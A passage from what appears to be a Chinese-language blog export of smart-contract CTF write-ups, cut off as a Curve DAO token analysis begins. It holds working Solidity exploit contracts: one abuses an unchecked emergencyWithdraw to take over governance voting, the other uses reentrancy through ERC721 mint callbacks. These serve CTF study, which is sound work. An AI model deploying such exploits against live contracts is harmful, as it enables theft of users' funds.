pendingSushi(uint256 _pid, address _user) external view returns (uint256) &#123;\n        PoolInfo storage pool = poolInfo[_pid];\n        UserInfo storage user = userInfo[_pid][_user];\n        uint256 accSushiPerShare = pool.accSushiPerShare;\n        uint256 lpSupply = pool.totalstake;\n        if (block.number > pool.lastRewardBlock &amp;&amp; lpSupply != 0) &#123;\n            uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);\n            uint256 sushiReward = multiplier.mul(sushiPerBlock).mul(pool.allocPoint).div(totalAllocPoint);\n            accSushiPerShare = accSushiPerShare.add(sushiReward.mul(1e12).div(lpSupply));\n        &#125;\n        return user.amount.mul(accSushiPerShare).div(1e12).sub(user.rewardDebt);\n    &#125;\n    function massUpdatePools() public &#123;\n        uint256 length = poolInfo.length;\n        for (uint256 pid = 0; pid &lt; length; ++pid) &#123;\n            updatePool(pid);\n        &#125;\n    &#125;\n\n    function updatePool(uint256 _pid) public &#123;\n        PoolInfo storage pool = poolInfo[_pid];\n        if (block.number &lt;= pool.lastRewardBlock) &#123;\n            return;\n        &#125;\n        uint256 lpSupply = pool.totalstake;\n        if (lpSupply == 0) &#123;\n            pool.lastRewardBlock = block.number;\n            return;\n        &#125;\n        uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);\n        uint256 sushiReward = multiplier.mul(sushiPerBlock).mul(pool.allocPoint).div(totalAllocPoint);\n        pool.accSushiPerShare = pool.accSushiPerShare.add(sushiReward.mul(1e12).div(lpSupply));\n        pool.lastRewardBlock = block.number;\n    &#125;\n\n    function deposit(uint256 _pid, uint256 _amount) public &#123;\n        PoolInfo storage pool = poolInfo[_pid];\n        UserInfo storage user = userInfo[_pid][msg.sender];\n        updatePool(_pid);\n        if (user.amount > 0) &#123;\n            uint256 pending = user.amount.mul(pool.accSushiPerShare).div(1e12).sub(user.rewardDebt);\n            safeTokenTransfer(msg.sender, pending);\n        &#125;\n        this.transferFrom(address(msg.sender), address(this), _amount);\n        user.amount = user.amount.add(_amount);\n        user.rewardDebt = user.amount.mul(pool.accSushiPerShare).div(1e12);\n        pool.totalstake += _amount; \n        emit Deposit(msg.sender, _pid, _amount);\n    &#125;\n\n    function withdraw(uint256 _pid, uint256 _amount) public &#123;\n        PoolInfo storage pool = poolInfo[_pid];\n        UserInfo storage user = userInfo[_pid][msg.sender];\n        require(user.amount >= _amount, \"withdraw: not good\");\n        updatePool(_pid);\n        uint256 pending = user.amount.mul(pool.accSushiPerShare).div(1e12).sub(user.rewardDebt);\n        safeTokenTransfer(msg.sender, pending);\n        user.amount = user.amount.sub(_amount);\n        user.rewardDebt = user.amount.mul(pool.accSushiPerShare).div(1e12);\n        pool.totalstake -= _amount; \n        this.transfer(address(msg.sender), _amount);\n        emit Withdraw(msg.sender, _pid, _amount);\n    &#125;\n\n    function emergencyWithdraw(uint256 _pid) public &#123;\n        PoolInfo memory pool = poolInfo[_pid];\n        UserInfo memory user = userInfo[_pid][msg.sender];\n        this.transfer(address(msg.sender), user.amount);\n        emit EmergencyWithdraw(msg.sender, _pid, user.amount);\n        pool.totalstake -= user.amount; \n        user.amount = 0;\n        user.rewardDebt = 0;\n    &#125;\n    \n    function safeTokenTransfer(address _to, uint256 _amount) internal &#123;\n        uint256 TokenBal = balanceOf(address(this));\n        if (_amount > TokenBal) &#123;\n            this.transfer(_to, TokenBal);\n        &#125; else &#123;\n           this.transfer(_to, _amount);\n        &#125;\n    &#125;\n&#125;\n\nAnalyse一个简化的governance和vote token模型\nstake pool，stake就有分红\n解决这个challenge要求成为ValidatorOwner，成为ValidatorOwner要求获得的vote超过vote token total supply的2&#x2F;3\n进行投票又要求vote token合约的owner为攻击者（或合约）\n再masterchef合约中只要用户有大于等于1000000vote即可任意切换owner\n总体的代码梳理一下就是存token，不论存多少都是一个块获得一个token的奖励，1000次airdrop想要获得1000000的token要等很久，于是继续向下看\nemergencyWithdraw函数没有进行任何限制而是public，其中对于变量的读取均是使用memory方式，属于逻辑上的漏洞，emergencywithdraw之后，进行了转账，但是数据没有更新，也就造成了任意退款\n多撸点空投全部存入，然后就疯狂的emergencywithdraw就可以了，但是masterchef合约最多只有10000000token，是达不到总发行量2&#x2F;3的，于是想到了compound的snapshot机制。转账再投票就可以了\nAttackcontract attack&#123;\n    Governance gov=Governance(0x8Ec7277F4C95B774e4941C63fD2d582c09cb0C10);\n    MasterChef master=MasterChef(0x4236ADb4611e781B149Aa8A94E8a16adCC8b6fC5);\n    bool flag;\n    bool condition;\n    Helper[8] public helper;\n\n    constructor()public&#123;\n        for(uint n=0;n&lt;8;n++)&#123;\n            helper[n]=new Helper();\n        &#125;\n    &#125;\n\n    function getAirdrop()public&#123;\n        for(uint i=0;i&lt;500;i++)\n        &#123;master.airdorp();&#125;\n    &#125;\n\n    function depositOrapprove()public&#123;\n        if(!flag)&#123;\n            master.approve(address(master),0xffffffffffffffffff);\n            flag=true;\n        &#125;else if(!condition)&#123;\n            uint balance=master.balanceOf(address(this));\n            master.deposit(0,balance);\n            for(uint x=0;x&lt;9;x++)&#123;\n                master.emergencyWithdraw(0);\n            &#125;\n            if(master.balanceOf(address(this))>8000000)&#123;\n                condition=true;\n            &#125;\n        &#125;else&#123;\n            master.deposit(0,200000);\n            master.emergencyWithdraw(0);\n        &#125;\n    &#125;\n\n    function flashloan()public&#123;\n        uint balance=master.balanceOf(address(this));\n        master.transfer(msg.sender,balance);\n        Helper(msg.sender).getOwnerAndVote();\n        require (balance==master.balanceOf(address(this)));\n    &#125;\n\n    function FirstVote()public&#123;\n        for(uint n=0;n&lt;8;n++)&#123;\n            helper[n].begin();\n        &#125;\n    &#125;\n\n    function SecondVote()public&#123;\n        master.transferOwnership(address(this));\n        gov.vote(address(this));\n    &#125;\n\n    function solve()public&#123;\n        gov.setValidator();\n        gov.setflag();\n    &#125;\n\n&#125;\n\ncontract Helper&#123;\n    Governance gov=Governance(0x8Ec7277F4C95B774e4941C63fD2d582c09cb0C10);\n    MasterChef master=MasterChef(0x4236ADb4611e781B149Aa8A94E8a16adCC8b6fC5);\n\n    function begin() public&#123;\n        attack(msg.sender).flashloan();\n    &#125;\n    function getOwnerAndVote()public&#123;\n        master.transferOwnership(address(this));\n        gov.vote(msg.sender);\n        repay(msg.sender);\n    &#125;\n\n    function repay(address to)public&#123;\n        uint balance=master.balanceOf(address(this));\n        master.transfer(to,balance);\n    &#125;\n&#125;\n\nstep1–deploy attack\nstep2–call function getAirdrop*2\nstep3–call function  depositOrapprove \nstep4–call function depositOrapprove until balance&gt;&#x3D;9000000\nstep5–call function FirstVote\nstep6–call function SecondVote\nstep7–call function solve to complete this challenge\nEveryThingIsArtCodepragma solidity ^0.8.0;\nimport \"./SafeMath.sol\";\n\n\nimport \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/utils/Context.sol\";\nimport \"@openzeppelin/contracts/utils/Strings.sol\";\nimport \"@openzeppelin/contracts/utils/introspection/ERC165.sol\";\n\n/**\n * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including\n * the Metadata extension, but not including the Enumerable extension, which is available separately as\n * &#123;ERC721Enumerable&#125;.\n */\ncontract ERC721 is Context, ERC165, IERC721, IERC721Metadata &#123;\n    using Address for address;\n    using Strings for uint256;\n\n    // Token name\n    string private _name;\n\n    // Token symbol\n    string private _symbol;\n\n    // Mapping from token ID to owner address\n    mapping(uint256 => address) private _owners;\n\n    // Mapping owner address to token count\n    mapping(address => uint256) private _balances;\n\n    // Mapping from token ID to approved address\n    mapping(uint256 => address) private _tokenApprovals;\n\n    // Mapping from owner to operator approvals\n    mapping(address => mapping(address => bool)) private _operatorApprovals;\n\n    /**\n     * @dev Initializes the contract by setting a `name` and a `symbol` to the token collection.\n     */\n    constructor(string memory name_, string memory symbol_) &#123;\n        _name = name_;\n        _symbol = symbol_;\n    &#125;\n\n    /**\n     * @dev See &#123;IERC165-supportsInterface&#125;.\n     */\n    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) &#123;\n        return\n            interfaceId == type(IERC721).interfaceId ||\n            interfaceId == type(IERC721Metadata).interfaceId ||\n            super.supportsInterface(interfaceId);\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721-balanceOf&#125;.\n     */\n    function balanceOf(address owner) public view virtual override returns (uint256) &#123;\n        require(owner != address(0), \"ERC721: address zero is not a valid owner\");\n        return _balances[owner];\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721-ownerOf&#125;.\n     */\n    function ownerOf(uint256 tokenId) public view virtual override returns (address) &#123;\n        address owner = _owners[tokenId];\n        require(owner != address(0), \"ERC721: invalid token ID\");\n        return owner;\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721Metadata-name&#125;.\n     */\n    function name() public view virtual override returns (string memory) &#123;\n        return _name;\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721Metadata-symbol&#125;.\n     */\n    function symbol() public view virtual override returns (string memory) &#123;\n        return _symbol;\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721Metadata-tokenURI&#125;.\n     */\n    function tokenURI(uint256 tokenId) public view virtual override returns (string memory) &#123;\n        _requireMinted(tokenId);\n\n        string memory baseURI = _baseURI();\n        return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : \"\";\n    &#125;\n\n    /**\n     * @dev Base URI for computing &#123;tokenURI&#125;. If set, the resulting URI for each\n     * token will be the concatenation of the `baseURI` and the `tokenId`. Empty\n     * by default, can be overridden in child contracts.\n     */\n    function _baseURI() internal view virtual returns (string memory) &#123;\n        return \"\";\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721-approve&#125;.\n     */\n    function approve(address to, uint256 tokenId) public virtual override &#123;\n        address owner = ERC721.ownerOf(tokenId);\n        require(to != owner, \"ERC721: approval to current owner\");\n\n        require(\n            _msgSender() == owner || isApprovedForAll(owner, _msgSender()),\n            \"ERC721: approve caller is not token owner nor approved for all\"\n        );\n\n        _approve(to, tokenId);\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721-getApproved&#125;.\n     */\n    function getApproved(uint256 tokenId) public view virtual override returns (address) &#123;\n        _requireMinted(tokenId);\n\n        return _tokenApprovals[tokenId];\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721-setApprovalForAll&#125;.\n     */\n    function setApprovalForAll(address operator, bool approved) public virtual override &#123;\n        _setApprovalForAll(_msgSender(), operator, approved);\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721-isApprovedForAll&#125;.\n     */\n    function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) &#123;\n        return _operatorApprovals[owner][operator];\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721-transferFrom&#125;.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public virtual override &#123;\n        //solhint-disable-next-line max-line-length\n        require(_isApprovedOrOwner(_msgSender(), tokenId), \"ERC721: caller is not token owner nor approved\");\n\n        _transfer(from, to, tokenId);\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721-safeTransferFrom&#125;.\n     */\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public virtual override &#123;\n        safeTransferFrom(from, to, tokenId, \"\");\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721-safeTransferFrom&#125;.\n     */\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes memory data\n    ) public virtual override &#123;\n        require(_isApprovedOrOwner(_msgSender(), tokenId), \"ERC721: caller is not token owner nor approved\");\n        _safeTransfer(from, to, tokenId, data);\n    &#125;\n\n    /**\n     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\n     * are aware of the ERC721 protocol to prevent tokens from being forever locked.\n     *\n     * `data` is additional data, it has no specified format and it is sent in call to `to`.\n     *\n     * This internal function is equivalent to &#123;safeTransferFrom&#125;, and can be used to e.g.\n     * implement alternative mechanisms to perform token transfer, such as signature-based.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must exist and be owned by `from`.\n     * - If `to` refers to a smart contract, it must implement &#123;IERC721Receiver-onERC721Received&#125;, which is called upon a safe transfer.\n     *\n     * Emits a &#123;Transfer&#125; event.\n     */\n    function _safeTransfer(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes memory data\n    ) internal virtual &#123;\n        _transfer(from, to, tokenId);\n        require(_checkOnERC721Received(from, to, tokenId, data), \"ERC721: transfer to non ERC721Receiver implementer\");\n    &#125;\n\n    /**\n     * @dev Returns whether `tokenId` exists.\n     *\n     * Tokens can be managed by their owner or approved accounts via &#123;approve&#125; or &#123;setApprovalForAll&#125;.\n     *\n     * Tokens start existing when they are minted (`_mint`),\n     * and stop existing when they are burned (`_burn`).\n     */\n    function _exists(uint256 tokenId) internal view virtual returns (bool) &#123;\n        return _owners[tokenId] != address(0);\n    &#125;\n\n    /**\n     * @dev Returns whether `spender` is allowed to manage `tokenId`.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must exist.\n     */\n    function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual returns (bool) &#123;\n        address owner = ERC721.ownerOf(tokenId);\n        return (spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender);\n    &#125;\n\n    /**\n     * @dev Safely mints `tokenId` and transfers it to `to`.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must not exist.\n     * - If `to` refers to a smart contract, it must implement &#123;IERC721Receiver-onERC721Received&#125;, which is called upon a safe transfer.\n     *\n     * Emits a &#123;Transfer&#125; event.\n     */\n    function _safeMint(address to, uint256 tokenId) internal virtual &#123;\n        _safeMint(to, tokenId, \"\");\n    &#125;\n\n    /**\n     * @dev Same as &#123;xref-ERC721-_safeMint-address-uint256-&#125;[`_safeMint`], with an additional `data` parameter which is\n     * forwarded in &#123;IERC721Receiver-onERC721Received&#125; to contract recipients.\n     */\n    function _safeMint(\n        address to,\n        uint256 tokenId,\n        bytes memory data\n    ) internal virtual &#123;\n        _mint(to, tokenId);\n        require(\n            _checkOnERC721Received(address(0), to, tokenId, data),\n            \"ERC721: transfer to non ERC721Receiver implementer\"\n        );\n    &#125;\n\n    /**\n     * @dev Mints `tokenId` and transfers it to `to`.\n     *\n     * WARNING: Usage of this method is discouraged, use &#123;_safeMint&#125; whenever possible\n     *\n     * Requirements:\n     *\n     * - `tokenId` must not exist.\n     * - `to` cannot be the zero address.\n     *\n     * Emits a &#123;Transfer&#125; event.\n     */\n    function _mint(address to, uint256 tokenId) internal virtual &#123;\n        require(to != address(0), \"ERC721: mint to the zero address\");\n        require(!_exists(tokenId), \"ERC721: token already minted\");\n\n        _beforeTokenTransfer(address(0), to, tokenId);\n\n        _balances[to] += 1;\n        _owners[tokenId] = to;\n\n        emit Transfer(address(0), to, tokenId);\n\n        _afterTokenTransfer(address(0), to, tokenId);\n    &#125;\n\n    /**\n     * @dev Destroys `tokenId`.\n     * The approval is cleared when the token is burned.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must exist.\n     *\n     * Emits a &#123;Transfer&#125; event.\n     */\n    function _burn(uint256 tokenId) internal virtual &#123;\n        address owner = ERC721.ownerOf(tokenId);\n\n        _beforeTokenTransfer(owner, address(0), tokenId);\n\n        // Clear approvals\n        _approve(address(0), tokenId);\n\n        _balances[owner] -= 1;\n        delete _owners[tokenId];\n\n        emit Transfer(owner, address(0), tokenId);\n\n        _afterTokenTransfer(owner, address(0), tokenId);\n    &#125;\n\n    /**\n     * @dev Transfers `tokenId` from `from` to `to`.\n     *  As opposed to &#123;transferFrom&#125;, this imposes no restrictions on msg.sender.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - `tokenId` token must be owned by `from`.\n     *\n     * Emits a &#123;Transfer&#125; event.\n     */\n    function _transfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal virtual &#123;\n        require(ERC721.ownerOf(tokenId) == from, \"ERC721: transfer from incorrect owner\");\n        require(to != address(0), \"ERC721: transfer to the zero address\");\n\n        _beforeTokenTransfer(from, to, tokenId);\n\n        // Clear approvals from the previous owner\n        _approve(address(0), tokenId);\n\n        _balances[from] -= 1;\n        _balances[to] += 1;\n        _owners[tokenId] = to;\n\n        emit Transfer(from, to, tokenId);\n\n        _afterTokenTransfer(from, to, tokenId);\n    &#125;\n\n    /**\n     * @dev Approve `to` to operate on `tokenId`\n     *\n     * Emits an &#123;Approval&#125; event.\n     */\n    function _approve(address to, uint256 tokenId) internal virtual &#123;\n        _tokenApprovals[tokenId] = to;\n        emit Approval(ERC721.ownerOf(tokenId), to, tokenId);\n    &#125;\n\n    /**\n     * @dev Approve `operator` to operate on all of `owner` tokens\n     *\n     * Emits an &#123;ApprovalForAll&#125; event.\n     */\n    function _setApprovalForAll(\n        address owner,\n        address operator,\n        bool approved\n    ) internal virtual &#123;\n        require(owner != operator, \"ERC721: approve to caller\");\n        _operatorApprovals[owner][operator] = approved;\n        emit ApprovalForAll(owner, operator, approved);\n    &#125;\n\n    /**\n     * @dev Reverts if the `tokenId` has not been minted yet.\n     */\n    function _requireMinted(uint256 tokenId) internal view virtual &#123;\n        require(_exists(tokenId), \"ERC721: invalid token ID\");\n    &#125;\n\n    /**\n     * @dev Internal function to invoke &#123;IERC721Receiver-onERC721Received&#125; on a target address.\n     * The call is not executed if the target address is not a contract.\n     *\n     * @param from address representing the previous owner of the given token ID\n     * @param to target address that will receive the tokens\n     * @param tokenId uint256 ID of the token to be transferred\n     * @param data bytes optional data to send along with the call\n     * @return bool whether the call correctly returned the expected magic value\n     */\n    function _checkOnERC721Received(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes memory data\n    ) private returns (bool) &#123;\n        if (to.isContract()) &#123;\n            try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) &#123;\n                return retval == IERC721Receiver.onERC721Received.selector;\n            &#125; catch (bytes memory reason) &#123;\n                if (reason.length == 0) &#123;\n                    revert(\"ERC721: transfer to non ERC721Receiver implementer\");\n                &#125; else &#123;\n                    /// @solidity memory-safe-assembly\n                    assembly &#123;\n                        revert(add(32, reason), mload(reason))\n                    &#125;\n                &#125;\n            &#125;\n        &#125; else &#123;\n            return true;\n        &#125;\n    &#125;\n\n    /**\n     * @dev Hook that is called before any token transfer. This includes minting\n     * and burning.\n     *\n     * Calling conditions:\n     *\n     * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be\n     * transferred to `to`.\n     * - When `from` is zero, `tokenId` will be minted for `to`.\n     * - When `to` is zero, ``from``'s `tokenId` will be burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal virtual &#123;&#125;\n\n    /**\n     * @dev Hook that is called after any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal virtual &#123;&#125;\n&#125;\n\n\ncontract EverytingIsArt is ERC721 &#123;\n    using SafeMath for *;\n\n    uint256 public totalMinted;\n\n    bool public hope = true;\n    bool public hope2 = true;\n\n    // Deploy by CTFer EOA account\n    constructor() public ERC721(\"All Arts\", \"AA\") &#123;&#125;\n\n    function becomeAnArtist(uint256 _count) public returns (bool) &#123;\n        require(_count >= 288, \"Why don't you want to be an artist?\");\n\n        for (uint256 i = 0; i &lt; _count; i++) &#123;\n            uint256 tokenId = totalMinted.add(1);\n            _safeMint(msg.sender, tokenId);\n            totalMinted = totalMinted.add(1);\n        &#125;\n\n        return true;\n    &#125;\n\n    function theHope() public returns (bool) &#123;\n        require(hope, \"Hope broken\");\n        require(uint64(uint160(msg.sender)).mod(88) != 0, \"Try again!\");\n\n        uint256 tokenId = totalMinted.add(1);\n        totalMinted = totalMinted.add(1);\n        _safeMint(msg.sender, tokenId);\n\n        hope = false;\n        return true;\n    &#125;\n\n    function hopeIsInSight() public returns (bool) &#123;\n        require(hope == false, \"Try again!\");\n        require(hope2 == true, \"Hope broken!\");\n        require(uint64(uint160(msg.sender)).mod(88) == 0, \"Try again!\");\n\n        uint256 tokenId = totalMinted.add(1);\n        totalMinted = totalMinted.add(1);\n        _safeMint(msg.sender, tokenId);\n\n        hope2 = false;\n        return true;\n    &#125;\n\n    // Artist or programmer? Just try again and again.\n    function isCompleted() public view returns (bool) &#123;\n        require(\n            balanceOf(msg.sender) == 288,\n            \"You are not yet a good artist, you should keep trying.\"\n        );\n\n        return true;\n    &#125;\n&#125;\n\nAnalyse看起来五百多行，但实际上大部分都是标准化的合约了，并且去掉注释以后也并不长，稍微看一下即可\nfunction theHope() public returns (bool) &#123;\n      require(hope, \"Hope broken\");\n      require(uint64(uint160(msg.sender)).mod(88) != 0, \"Try again!\");\n\n      uint256 tokenId = totalMinted.add(1);\n      totalMinted = totalMinted.add(1);\n      _safeMint(msg.sender, tokenId);\n\n      hope = false;\n      return true;\n  &#125;\n\n该函数先进行mint，再修改变量\nsafemint时会调用接受合约的onERC721Received函数，只要返回\nbytes4(keccak256(abi.encodePacked(“onERC721Received(address,address,uint,bytes memory)”)))即可，造成了重入漏洞\n但是在进行实操时候发现，最大只能重入107次，此时gas达到0.073，在多一次即无法达到每一次重入都得到正确的返回值。\nhopeIsInSight函数也是同理\n所以最后使用的解题方式是直接调用becomeAnArtist函数，在调用iscompleted函数\nAttack最终使用的时直接调用becomeAnArtist函数\n但是还是放一下重入的攻击思路吧\ncontract Attack1&#123;\n    address public adr;\n    uint n = 1;\n    EverytingIsArt cont;\n    constructor(address _adr) &#123;\n        adr = _adr;\n        cont = EverytingIsArt(adr);\n    &#125;\n    event ERC721Received( address operator,\n        address from,\n        uint256 tokenId,\n        bytes data);\n\n     function onERC721Received(// max 107 times\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata data\n    ) public returns (bytes4) &#123;\n        emit ERC721Received(operator,from,tokenId,data);\n        if (n>=20)&#123;\n            return this.onERC721Received.selector;\n        &#125;else&#123;\n            n++;\n            cont.theHope();\n            return this.onERC721Received.selector;\n        &#125;\n    &#125;\n    function myName() public view virtual returns (string memory)&#123;\n        return \"MyToken721UUPSV1_Holder\";\n    &#125;\n\n    function attack() public payable&#123;\n            cont.theHope();\n    &#125;\n&#125;\n\n","slug":"The 2nd Trusted Chain","date":"2022-08-20T07:50:42.857Z","categories_index":"","tags_index":"区块链 ctf","author_index":"bcYng"},{"id":"1146d1d2628e1e9294dd0b11fc71e317","title":"Analysis of Curve","content":"\n\nFlow chart\nCurve TokenCode\nClick to see more\n# @version 0.2.4\n\"\"\"\n@title Curve DAO Token\n@author Curve Finance\n@license MIT\n@notice ERC20 with piecewise-linear mining supply.\n@dev Based on the ERC-20 token standard as defined at\n     https://eips.ethereum.org/EIPS/eip-20\n\"\"\"\n\nfrom vyper.interfaces import ERC20\n\nimplements: ERC20\n\n\nevent Transfer:\n    _from: indexed(address)\n    _to: indexed(address)\n    _value: uint256\n\nevent Approval:\n    _owner: indexed(address)\n    _spender: indexed(address)\n    _value: uint256\n\nevent UpdateMiningParameters:\n    time: uint256\n    rate: uint256\n    supply: uint256\n\nevent SetMinter:\n    minter: address\n\nevent SetAdmin:\n    admin: address\n\n\nname: public(String[64])\nsymbol: public(String[32])\ndecimals: public(uint256)\n\nbalanceOf: public(HashMap[address, uint256])\nallowances: HashMap[address, HashMap[address, uint256]]\ntotal_supply: uint256\n\nminter: public(address)\nadmin: public(address)\n\n# General constants\nYEAR: constant(uint256) = 86400 * 365\n\n# Allocation:\n# =========\n# * shareholders - 30%\n# * emplyees - 3%\n# * DAO-controlled reserve - 5%\n# * Early users - 5%\n# == 43% ==\n# left for inflation: 57%\n\n# Supply parameters\nINITIAL_SUPPLY: constant(uint256) = 1_303_030_303\nINITIAL_RATE: constant(uint256) = 274_815_283 * 10 ** 18 / YEAR  # leading to 43% premine\nRATE_REDUCTION_TIME: constant(uint256) = YEAR\nRATE_REDUCTION_COEFFICIENT: constant(uint256) = 1189207115002721024  # 2 ** (1/4) * 1e18\nRATE_DENOMINATOR: constant(uint256) = 10 ** 18\nINFLATION_DELAY: constant(uint256) = 86400\n\n# Supply variables\nmining_epoch: public(int128)\nstart_epoch_time: public(uint256)\nrate: public(uint256)\n\nstart_epoch_supply: uint256\n\n\n@external\ndef __init__(_name: String[64], _symbol: String[32], _decimals: uint256):\n    \"\"\"\n    @notice Contract constructor\n    @param _name Token full name\n    @param _symbol Token symbol\n    @param _decimals Number of decimals for token\n    \"\"\"\n    init_supply: uint256 = INITIAL_SUPPLY * 10 ** _decimals\n    self.name = _name\n    self.symbol = _symbol\n    self.decimals = _decimals\n    self.balanceOf[msg.sender] = init_supply\n    self.total_supply = init_supply\n    self.admin = msg.sender\n    log Transfer(ZERO_ADDRESS, msg.sender, init_supply)\n\n    self.start_epoch_time = block.timestamp + INFLATION_DELAY - RATE_REDUCTION_TIME\n    self.mining_epoch = -1\n    self.rate = 0\n    self.start_epoch_supply = init_supply\n\n\n@internal\ndef _update_mining_parameters():\n    \"\"\"\n    @dev Update mining rate and supply at the start of the epoch\n         Any modifying mining call must also call this\n    \"\"\"\n    _rate: uint256 = self.rate\n    _start_epoch_supply: uint256 = self.start_epoch_supply\n\n    self.start_epoch_time += RATE_REDUCTION_TIME\n    self.mining_epoch += 1\n\n    if _rate == 0:\n        _rate = INITIAL_RATE\n    else:\n        _start_epoch_supply += _rate * RATE_REDUCTION_TIME\n        self.start_epoch_supply = _start_epoch_supply\n        _rate = _rate * RATE_DENOMINATOR / RATE_REDUCTION_COEFFICIENT\n\n    self.rate = _rate\n\n    log UpdateMiningParameters(block.timestamp, _rate, _start_epoch_supply)\n\n\n@external\ndef update_mining_parameters():\n    \"\"\"\n    @notice Update mining rate and supply at the start of the epoch\n    @dev Callable by any address, but only once per epoch\n         Total supply becomes slightly larger if this function is called late\n    \"\"\"\n    assert block.timestamp >= self.start_epoch_time + RATE_REDUCTION_TIME  # dev: too soon!\n    self._update_mining_parameters()\n\n\n@external\ndef start_epoch_time_write() -> uint256:\n    \"\"\"\n    @notice Get timestamp of the current mining epoch start\n            while simultaneously updating mining parameters\n    @return Timestamp of the epoch\n    \"\"\"\n    _start_epoch_time: uint256 = self.start_epoch_time\n    if block.timestamp >= _start_epoch_time + RATE_REDUCTION_TIME:\n        self._update_mining_parameters()\n        return self.start_epoch_time\n    else:\n        return _start_epoch_time\n\n\n@external\ndef future_epoch_time_write() -> uint256:\n    \"\"\"\n    @notice Get timestamp of the next mining epoch start\n            while simultaneously updating mining parameters\n    @return Timestamp of the next epoch\n    \"\"\"\n    _start_epoch_time: uint256 = self.start_epoch_time\n    if block.timestamp >= _start_epoch_time + RATE_REDUCTION_TIME:\n        self._update_mining_parameters()\n        return self.start_epoch_time + RATE_REDUCTION_TIME\n    else:\n        return _start_epoch_time + RATE_REDUCTION_TIME\n\n\n@internal\n@view\ndef _available_supply() -> uint256:\n    return self.start_epoch_supply + (block.timestamp - self.start_epoch_time) * self.rate\n\n\n@external\n@view\ndef available_supply() -> uint256:\n    \"\"\"\n    @notice Current number of tokens in existence (claimed or unclaimed)\n    \"\"\"\n    return self._available_supply()\n\n\n@external\n@view\ndef mintable_in_timeframe(start: uint256, end: uint256) -> uint256:\n    \"\"\"\n    @notice How much supply is mintable from start timestamp till end timestamp\n    @param start Start of the time interval (timestamp)\n    @param end End of the time interval (timestamp)\n    @return Tokens mintable from `start` till `end`\n    \"\"\"\n    assert start &lt;= end  # dev: start > end\n    to_mint: uint256 = 0\n    current_epoch_time: uint256 = self.start_epoch_time\n    current_rate: uint256 = self.rate\n\n    # Special case if end is in future (not yet minted) epoch\n    if end > current_epoch_time + RATE_REDUCTION_TIME:\n        current_epoch_time += RATE_REDUCTION_TIME\n        current_rate = current_rate * RATE_DENOMINATOR / RATE_REDUCTION_COEFFICIENT\n\n    assert end &lt;= current_epoch_time + RATE_REDUCTION_TIME  # dev: too far in future\n\n    for i in range(999):  # Curve will not work in 1000 years. Darn!\n        if end >= current_epoch_time:\n            current_end: uint256 = end\n            if current_end > current_epoch_time + RATE_REDUCTION_TIME:\n                current_end = current_epoch_time + RATE_REDUCTION_TIME\n\n            current_start: uint256 = start\n            if current_start >= current_epoch_time + RATE_REDUCTION_TIME:\n                break  # We should never get here but what if...\n            elif current_start &lt; current_epoch_time:\n                current_start = current_epoch_time\n\n            to_mint += current_rate * (current_end - current_start)\n\n            if start >= current_epoch_time:\n                break\n\n        current_epoch_time -= RATE_REDUCTION_TIME\n        current_rate = current_rate * RATE_REDUCTION_COEFFICIENT / RATE_DENOMINATOR  # double-division with rounding made rate a bit less => good\n        assert current_rate &lt;= INITIAL_RATE  # This should never happen\n\n    return to_mint\n\n\n@external\ndef set_minter(_minter: address):\n    \"\"\"\n    @notice Set the minter address\n    @dev Only callable once, when minter has not yet been set\n    @param _minter Address of the minter\n    \"\"\"\n    assert msg.sender == self.admin  # dev: admin only\n    assert self.minter == ZERO_ADDRESS  # dev: can set the minter only once, at creation\n    self.minter = _minter\n    log SetMinter(_minter)\n\n\n@external\ndef set_admin(_admin: address):\n    \"\"\"\n    @notice Set the new admin.\n    